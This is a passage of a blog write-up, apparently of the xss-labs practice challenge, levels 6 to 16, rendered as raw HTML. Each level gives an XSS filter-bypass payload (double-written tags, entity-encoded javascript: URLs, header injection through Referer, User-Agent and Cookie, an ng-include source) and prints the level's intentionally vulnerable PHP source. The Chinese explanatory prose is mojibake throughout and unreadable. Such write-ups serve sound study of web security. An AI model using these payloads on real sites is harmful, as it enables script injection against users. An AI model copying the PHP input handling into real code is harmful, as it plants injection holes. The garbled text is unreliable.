class="line">/level6.php?keyword=&quot;&gt;+&lt;a+HrEf%3Djavascript%3Aalert(&#x27;xss&#x27;)+&gt;+xss&lt;%2Fa&gt;+%2F%2F&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-5"><a href="#æºç åˆ†æ-5" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><p>åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level7.php?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;%2Fscrscriptipt&gt;//&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-6"><a href="#æºç åˆ†æ-6" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><p><code>unicode</code>ç¼–ç ä¸€ä¸‹å³å¯ï¼ˆ<a href="http://www.ab173.com/convert/Unicode.php">å·¥å…·</a>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br><span class="line"></span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level8.php?keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B&amp;submit=æ·»åŠ å‹æƒ…é“¾æ¥</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-7"><a href="#æºç åˆ†æ-7" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-8"><a href="#æºç åˆ†æ-8" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="comment">//è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))  <span class="comment">//éœ€è¦å«æœ‰http://</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level10.php?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">/level10.php?keyword=1&amp;t_sort=1&quot;onclick=&quot;alert(1)&quot;type=&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-9"><a href="#æºç åˆ†æ-9" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><h3 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h3><p><code>header</code>é‡Œé¢æ·»åŠ <code>Referer</code>å­—æ®µå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">Referer:1&quot;onclick=&quot;alert(1)&quot;type=&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-10"><a href="#æºç åˆ†æ-10" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><h3 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-11"><a href="#æºç åˆ†æ-11" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><h3 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-12"><a href="#æºç åˆ†æ-12" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><blockquote><p>æœ¬å…³å› <strong>iframe</strong>è°ƒç”¨çš„æ–‡ä»¶åœ°å€å¤±æ•ˆï¼Œæ— æ³•è¿›è¡Œæµ‹è¯•ã€‚</p><p>è¦è€ƒçš„åº”è¯¥æ˜¯é€šè¿‡ä¿®æ”¹<code>iframeè°ƒç”¨</code>çš„æ–‡ä»¶æ¥å®ç°xssæ³¨å…¥</p></blockquote><h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><h3 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h3><p><code>src</code>åœ°å€æ›´æ¢æˆ<code>https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level15.php?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-13"><a href="#æºç åˆ†æ-13" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><blockquote><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&utm_relevant_index=1">åŸæ–‡åœ°å€</a></p><p><code>ng-include</code>æ˜¯<code>angular js</code>ä¸­çš„ä¸œè¥¿ï¼Œå…¶ä½œç”¨ç›¸å½“äº<code>php</code>çš„<code>include</code>å‡½æ•°</p><p>1ã€ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTMLæ–‡ä»¶ã€‚</p><p>2ã€åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p><p>3ã€ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p><p>4ã€é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p><p>ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š</p><p>1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·</p><p>2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ</p><p>3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><h3 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h3><p><code>%0A</code>è¡¨ç¤ºæ¢è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img%0Asrc=&quot;111&quot;%0Aonerror=alert(&#x27;xss&#x27;)%0A&gt;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-14"><a href="#æºç åˆ†æ-14" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ 